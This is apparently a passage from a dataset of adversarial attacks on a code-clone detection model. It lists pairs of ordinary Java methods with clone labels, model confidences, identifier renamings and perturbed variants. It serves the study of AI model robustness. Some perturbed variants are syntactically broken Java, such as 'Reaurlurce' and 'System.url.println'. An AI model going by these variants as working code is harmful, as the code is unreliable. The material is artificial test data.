            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 13, '*ch', '*ches', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 14, '*sh', '*shes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 15, '*x', '*xes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 16, '*z', '*zes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 17, '*Cy', '*Cies', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 18, '*', '*s', TRUE)"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (1, '$N[.N]', 'D+', 100, 'money')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (2, 'N/N/N', 'D+', 200, 'date')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (3, '[/](C/)C', 'D+', 300, 'unix path')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (4, '[A:](C\\\\)C', 'D+', 400, 'dos path')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (5, 'N:N', 'D+', 500, 'time')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (6, 'N.N.N.N', 'D+', 600, 'internet')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (7, 'E(.E)', 'D+', 700, 'hostname')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (8, '{+-}N[.N]', 'D+', 800, 'number')"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('i', 1, 3, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('we', 1, 3, TRUE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('they', 3, 3, TRUE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('he', 3, 1, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('she', 3, 2, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('it', 3, 3, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('you', 2, 3, FALSE)"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('actor')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('origin')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('destination')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('object')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('instrument')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('beneficiary')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('location')"");
            stmt.executeUpdate(""insert into Verbs (VerbName, SubjectSlot, IndirectObjectSlot, PredicateNounSlot) values ('throw', 'actor', 'destination', 'object')"");
            stmt.executeUpdate(""insert into Verbs (VerbName, SubjectSlot, IndirectObjectSlot, PredicateNounSlot) values ('melt', 'actor', '', '')"");
            stmt.executeUpdate(""insert into Verbs (VerbName, SubjectSlot, IndirectObjectSlot, PredicateNounSlot) values ('kill', 'actor', '', 'object')"");
            stmt.executeUpdate(""insert into AdverbPrepositions (PrepositionName, ObjectId, FrameSlot) values ('with', 200, 'instrument')"");
            stmt.executeUpdate(""insert into AdverbPrepositions (PrepositionName, ObjectId, FrameSlot) values ('at', 1, 'location')"");
            stmt.executeUpdate(""insert into Articles (ArticleName, Dereference) values ('the', 1)"");
            stmt.executeUpdate(""insert into Articles (ArticleName, Dereference) values ('a', 2)"");
            stmt.executeUpdate(""insert into Articles (ArticleName, Dereference) values ('an', 2)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('S', 1)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PN', 2)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('DO', 3)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('IO', 4)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PO', 5)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('NP', 6)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('AV', 7)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('LV', 8)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PREP', 9)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('D', 10)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('ADJ', 11)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('ADV', 12)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('CONJ', 13)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('INTJ', 14)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PA', 15)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('HV', 16)"");
            stmt.executeQuery(""select setval('instructions_instructionid_seq', 1)"");
            int next = 2;
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'throw', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'test', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (2, null, 'actor', 1, 'hasa', '300', '')"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (2, null, 'instrument', 3, null, null, 'blue')"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (1, null, null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'get', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'drop', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 2) + "", 1, "" + (next + 0) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 2) + "", 2, "" + (next + 1) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 3) + "", 1, "" + (next + 1) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 3) + "", 2, "" + (next + 0) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 4) + "", 1, "" + (next + 2) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 4) + "", 2, "" + (next + 3) + "")"");
            stmt.executeQuery(""select setval('transactions_transactionid_seq', 1)"");
            stmt.executeUpdate(""insert into Transactions (InstructionId, Description) values ("" + (next + 4) + "", 'throw something')"");
            stmt.executeUpdate(""insert into Transactions (InstructionId, Description) values ("" + (next + 5) + "", 'get something')"");
            stmt.executeUpdate(""insert into Transactions (InstructionId, Description) values ("" + (next + 6) + "", 'drop something')"");
            stmt.executeUpdate(""insert into TransactionPreconditions (TransactionId, IfFrameSlot, Operator, LinkName, LinkFrameSlot, AttributeName, SatisfyTransactionId) "" + ""values (2, 'actor', 1, 'hasa', 'object', '', 3)"");
            stmt.executeUpdate(""insert into TransactionPreconditions (TransactionId, IfFrameSlot, Operator, LinkName, LinkFrameSlot, AttributeName, SatisfyTransactionId) "" + ""values (2, 'object', 4, '', '', 'heavy', 4)"");
            stmt.executeUpdate(""insert into TransactionSlots (TransactionId, FrameSlot, InstructionId) values (2, 'object', "" + (next + 6) + "")"");
            stmt.executeUpdate(""insert into TransactionSlots (TransactionId, FrameSlot, InstructionId) values (2, 'destination', "" + (next + 5) + "")"");
            stmt.executeQuery(""select setval('verbtransactions_verbid_seq', 1)"");
            stmt.executeUpdate(""insert into VerbTransactions (VerbString, MoodType, TransactionId) values ('throw', 2, 2)"");
            stmt.executeUpdate(""insert into VerbConstraints (VerbId, FrameSlot, ObjectId) values (2, 'object', 200)"");
            stmt.executeUpdate(""update SystemProperties set value = 'Play Data' where name = 'DB Data Version'"");
            conn.commit();
        } catch (SQLException e) {
            if (conn != null) conn.rollback();
            throw e;
        } finally {
            if (stmt != null) stmt.close();
            if (conn != null) conn.close();
        }
    }
 <SPLIT>     public String get(String url) {
        try {
            HttpGet get = new HttpGet(url);
            HttpResponse response = this.getHttpClient().execute(get);
            HttpEntity entity = response.getEntity();
            if (entity == null) {
                throw new RuntimeException(""response body was empty"");
            }
            return EntityUtils.toString(entity);
        } catch (RuntimeException ex) {
            throw ex;
        } catch (Exception ex) {
            throw new RuntimeException(ex);
        }
    }
",2154,,LABEL_0,LABEL_0,LABEL_0,-1,"load,conn,stmt",,,,0,,0,GA,1189,0.9277731060981751,failed,[]
8,"    @Test
    public void testStandardTee() throws Exception {
        final String reference = ""test"";
        final Reader source = new StringReader(reference);
        final StringWriter destination1 = new StringWriter();
        final StringWriter destination2 = new StringWriter();
        final TeeWriter tee = new TeeWriter(destination1, destination2);
        org.apache.commons.io.IOUtils.copy(source, tee);
        tee.close();
        assertEquals(""the two string are equals"", reference, destination1.toString());
        assertEquals(""the two string are equals"", reference, destination2.toString());
        assertEquals(""byte count"", reference.length(), tee.getSize());
    }
 <SPLIT>     public static void buildDeb(File debFile, File controlFile, File dataFile) throws IOException {
        long now = new Date().getTime() / 1000;
        OutputStream deb = new FileOutputStream(debFile);
        deb.write(""!<arch>\n"".getBytes());
        startFileEntry(deb, DEBIAN_BINARY_NAME, now, DEBIAN_BINARY_CONTENT.length());
        deb.write(DEBIAN_BINARY_CONTENT.getBytes());
        endFileEntry(deb, DEBIAN_BINARY_CONTENT.length());
        startFileEntry(deb, CONTROL_NAME, now, controlFile.length());
        FileInputStream control = new FileInputStream(controlFile);
        byte[] buffer = new byte[1024];
        while (true) {
            int read = control.read(buffer);
            if (read == -1) break;
            deb.write(buffer, 0, read);
        }
        control.close();
        endFileEntry(deb, controlFile.length());
        startFileEntry(deb, DATA_NAME, now, dataFile.length());
        FileInputStream data = new FileInputStream(dataFile);
        while (true) {
            int read = data.read(buffer);
            if (read == -1) break;
            deb.write(buffer, 0, read);
        }
        data.close();
        endFileEntry(deb, dataFile.length());
        deb.close();
    }
",132,"    @Test
    public void testStandardBee() throws Exception {
        final String index = ""test"";
        final Reaurlurce = new StringReader(index);
        final StringWriter destination1 = new StringWriter();
        final StringWriter descinations2 = new StringWriter();
        final TeeWriter tTEc= new TeeWriter(destination1, descinations2);
        org.apache.commons.io.IOUtils.copy(url, TEc);
        TEc.close();
        assertEquals(""the two string are equals"", index, destination1.toString());
        assertEquals(""the two string are equals"", index, descinations2.toString());
        assertEquals(""byte count"", index.length(), TEc.getSize());
    }
",LABEL_1,LABEL_1,0.8374331593513489,1,"testStandardTee,reference,source,destination1,destination2,tee",,,,3,"testStandardTee:testStandardBee,reference:index,source:url,destination1:destination1,destination2:descinations2,tee:TEc,",1,GA,352,0.1271840532620748,ga,[]
9,"    @Override
    public void incluir(Igreja igreja) throws Exception {
        Connection connection = criaConexao(false);
        String sql = ""insert into igreja ? as idlocal, ? as possui_salao;"";
        String sql2 = ""SELECT MAX(idlocal) FROM Local"";
        PreparedStatement stmt = null;
        PreparedStatement stmt2 = null;
        ResultSet rs = null;
        try {
            stmt = connection.prepareStatement(sql);
            stmt2 = connection.prepareStatement(sql2);
            rs = stmt2.executeQuery();
            stmt.setInt(1, rs.getInt(""max""));
            stmt.setBoolean(2, igreja.getPossuiSalao());
            int retorno = stmt.executeUpdate();
            if (retorno == 0) {
                connection.rollback();
                throw new SQLException(""Ocorreu um erro inesperado no momento de inserir dados de cliente no banco!"");
            }
            connection.commit();
        } catch (SQLException e) {
            connection.rollback();
            throw e;
        } finally {
            try {
                stmt.close();
                stmt2.close();
                rs.close();
                this.fechaConexao();
            } catch (SQLException e) {
                throw e;
            }
        }
    }
 <SPLIT>     protected void connect() throws SocketException, IOException, LoginFailException {
        logger.info(""Connect to FTP Server "" + account.getServer());
        client = new FTPClient();
        client.connect(account.getServer());
        if (client.login(account.getId(), account.getPassword()) == false) {
            logger.info(""Fail to login with id="" + account.getId());
            throw new LoginFailException(account.getId(), account.getPassword());
        }
    }
",203,,LABEL_0,LABEL_0,LABEL_0,-1,"incluir,igreja,connection,sql,sql2,stmt,stmt2,rs,retorno",,,,0,,0,GA,3235,1.1648216764132182,failed,[]
10,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
 <SPLIT>     private void copyFileTo(File destination) throws IOException {
        logger.fine(""Copying from "" + destination + ""..."");
        FileChannel srcChannel = new FileInputStream(getAbsolutePath()).getChannel();
        logger.fine(""...got source channel "" + srcChannel + ""..."");
        FileChannel destChannel = new FileOutputStream(new File(destination.getAbsolutePath())).getChannel();
        logger.fine(""...got destination channel "" + destChannel + ""..."");
        logger.fine(""...Got channels..."");
        destChannel.transferFrom(srcChannel, 0, srcChannel.size());
        logger.fine(""...transferred."");
        srcChannel.close();
        destChannel.close();
    }
",272,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream ciris = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcdcmParser DcmParserFactory.getInstance().newDcmParser(ciris);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdpdReader pdFact.newReader(dsdsciris, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.url.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream url = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(url, dcmEncParam);
        ds.writeHeader(url, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.url.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, url, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        url.flush();
        url.close();
        System.url.println(""done!"");
    }
",LABEL_1,LABEL_1,0.8113747239112854,1,"readAndRewrite,inFile,outFile,iis,dcmParser,ds,pdReader,out,dcmEncParam,pdWriter",,,,30,"readAndRewrite:readAndRewrite,inFile:inFile,outFile:outFile,iis:ciris,dcmParser:dcmParser,ds:ds,pdReader:pdReader,out:url,dcmEncParam:dcmEncParam,pdWriter:pdWriter,",8,GA,553,0.20423238674799601,ga,[]
11,"    public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
 <SPLIT>     private void displayDiffResults() throws IOException {
        File outFile = File.createTempFile(""diff"", "".htm"");
        outFile.deleteOnExit();
        FileOutputStream outStream = new FileOutputStream(outFile);
        BufferedWriter out = new BufferedWriter(new OutputStreamWriter(outStream));
        out.write(""<html><head><title>LOC Differences</title>\n"" + SCRIPT + ""</head>\n"" + ""<body bgcolor='#ffffff'>\n"" + ""<div onMouseOver=\""window.defaultStatus='Metrics'\"">\n"");
        if (addedTable.length() > 0) {
            out.write(""<table border><tr><th>Files Added:</th>"" + ""<th>Add</th><th>Type</th></tr>"");
            out.write(addedTable.toString());
            out.write(""</table><br><br>"");
        }
        if (modifiedTable.length() > 0) {
            out.write(""<table border><tr><th>Files Modified:</th>"" + ""<th>Base</th><th>Del</th><th>Mod</th><th>Add</th>"" + ""<th>Total</th><th>Type</th></tr>"");
            out.write(modifiedTable.toString());
            out.write(""</table><br><br>"");
        }
        if (deletedTable.length() > 0) {
            out.write(""<table border><tr><th>Files Deleted:</th>"" + ""<th>Del</th><th>Type</th></tr>"");
            out.write(deletedTable.toString());
            out.write(""</table><br><br>"");
        }
        out.write(""<table name=METRICS BORDER>\n"");
        if (modifiedTable.length() > 0 || deletedTable.length() > 0) {
            out.write(""<tr><td>Base:&nbsp;</td><td>"");
            out.write(Long.toString(base));
            out.write(""</td></tr>\n<tr><td>Deleted:&nbsp;</td><td>"");
            out.write(Long.toString(deleted));
            out.write(""</td></tr>\n<tr><td>Modified:&nbsp;</td><td>"");
            out.write(Long.toString(modified));
            out.write(""</td></tr>\n<tr><td>Added:&nbsp;</td><td>"");
            out.write(Long.toString(added));
            out.write(""</td></tr>\n<tr><td>New & Changed:&nbsp;</td><td>"");
            out.write(Long.toString(added + modified));
            out.write(""</td></tr>\n"");
        }
        out.write(""<tr><td>Total:&nbsp;</td><td>"");
        out.write(Long.toString(total));
        out.write(""</td></tr>\n</table></div>"");
        redlinesOut.close();
        out.flush();
        InputStream redlines = new FileInputStream(redlinesTempFile);
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = redlines.read(buffer)) != -1) outStream.write(buffer, 0, bytesRead);
        outStream.write(""</BODY></HTML>"".getBytes());
        outStream.close();
        Browser.launch(outFile.toURL().toString());
    }
",765,"    public void convert(File url, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(url));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""
"" + url + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""
"" + url + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean insflating = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (insflating) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""
"" + url + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (insflating) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",LABEL_1,LABEL_1,0.7721828818321228,1,"convert,src,dest,in,p,ds,format,hasPixelData,inflate,pxlen,out",,,,84,"convert:convert,src:url,dest:dest,in:in,p:p,ds:ds,format:format,hasPixelData:hasPixelData,inflate:insflating,pxlen:pxlen,out:out,",9,GA,583,0.2531207998593648,ga,[]
12,"    public static void copyFile(File source, File dest) throws IOException {
        FileChannel in = null, out = null;
        try {
            in = new FileInputStream(source).getChannel();
            out = new FileOutputStream(dest).getChannel();
            in.transferTo(0, in.size(), out);
        } catch (FileNotFoundException fnfe) {
            Log.debug(fnfe);
        } finally {
            if (in != null) in.close();
            if (out != null) out.close();
        }
    }
 <SPLIT>     public void deleteObject(String id) throws SQLException {
        boolean selfConnection = true;
        Connection conn = null;
        PreparedStatement stmt = null;
        try {
            if (dbConnection == null) {
                DatabaseConn dbConn = new DatabaseConn();
                conn = dbConn.getConnection();
                conn.setAutoCommit(false);
            } else {
                conn = dbConnection;
                selfConnection = false;
            }
            stmt = conn.prepareStatement(this.deleteSql);
            stmt.setString(1, id);
            stmt.executeUpdate();
            if (selfConnection) conn.commit();
        } catch (Exception e) {
            if (selfConnection && conn != null) conn.rollback();
            throw new SQLException(e.getMessage());
        } finally {
            if (stmt != null) {
                stmt.close();
                stmt = null;
            }
            if (selfConnection && conn != null) {
                conn.close();
                conn = null;
            }
        }
    }
",108,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,source,dest,in,out",,,,0,,0,GA,1855,0.6616315960884094,failed,[]
13,"    public static void copy(String from_name, String to_name) throws IOException {
        File from_file = new File(from_name);
        File to_file = new File(to_name);
        if (!from_file.exists()) abort(""FileCopy: no such source file: "" + from_name);
        if (!from_file.isFile()) abort(""FileCopy: can't copy directory: "" + from_name);
        if (!from_file.canRead()) abort(""FileCopy: source file is unreadable: "" + from_name);
        if (to_file.isDirectory()) to_file = new File(to_file, from_file.getName());
        if (to_file.exists()) {
            if (!to_file.canWrite()) abort(""FileCopy: destination file is unwriteable: "" + to_name);
        } else {
            String parent = to_file.getParent();
            if (parent == null) parent = System.getProperty(""user.dir"");
            File dir = new File(parent);
            if (!dir.exists()) abort(""FileCopy: destination directory doesn't exist: "" + parent);
            if (dir.isFile()) abort(""FileCopy: destination is not a directory: "" + parent);
            if (!dir.canWrite()) abort(""FileCopy: destination directory is unwriteable: "" + parent);
        }
        FileInputStream from = null;
        FileOutputStream to = null;
        try {
            from = new FileInputStream(from_file);
            to = new FileOutputStream(to_file);
            byte[] buffer = new byte[4096];
            int bytes_read;
            while ((bytes_read = from.read(buffer)) != -1) {
                to.write(buffer, 0, bytes_read);
            }
        } finally {
            if (from != null) {
                try {
                    from.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (to != null) {
                try {
                    to.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
 <SPLIT>     public static void copy(File from, File to) {
        boolean result;
        if (from.isDirectory()) {
            File[] subFiles = from.listFiles();
            for (int i = 0; i < subFiles.length; i++) {
                File newDir = new File(to, subFiles[i].getName());
                result = false;
                if (subFiles[i].isDirectory()) {
                    if (newDir.exists()) result = true; else result = newDir.mkdirs();
                } else if (subFiles[i].isFile()) {
                    try {
                        result = newDir.createNewFile();
                    } catch (IOException e) {
                        log.error(""unable to create new file: "" + newDir, e);
                        result = false;
                    }
                }
                if (result) copy(subFiles[i], newDir);
            }
        } else if (from.isFile()) {
            FileInputStream in = null;
            FileOutputStream out = null;
            try {
                in = new FileInputStream(from);
                out = new FileOutputStream(to);
                int fileLength = (int) from.length();
                char charBuff[] = new char[fileLength];
                int len;
                int oneChar;
                while ((oneChar = in.read()) != -1) {
                    out.write(oneChar);
                }
            } catch (FileNotFoundException e) {
                log.error(""File not found!"", e);
            } catch (IOException e) {
                log.error(""Unable to read from file!"", e);
            } finally {
                try {
                    if (in != null) in.close();
                    if (out != null) out.close();
                } catch (IOException e1) {
                    log.error(""Error closing file reader/writer"", e1);
                }
            }
        }
    }
